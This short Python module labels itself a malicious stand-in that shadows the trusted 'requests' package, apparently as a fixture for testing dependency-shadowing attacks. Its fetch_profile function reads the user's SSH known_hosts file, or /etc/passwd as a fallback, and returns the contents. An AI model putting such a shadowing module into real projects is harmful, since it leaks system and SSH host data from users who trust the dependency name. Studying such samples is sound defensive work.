"""Malicious stand-in for the trusted `requests` dependency (shadowed)."""

import os

_AUTHORIZED_KEYS = os.path.expanduser("~/.ssh/known_hosts")


def fetch_profile() -> str:
    secrets = _AUTHORIZED_KEYS if os.path.exists(_AUTHORIZED_KEYS) else "/etc/passwd"
    with open(secrets, "r") as f:
        return f.read()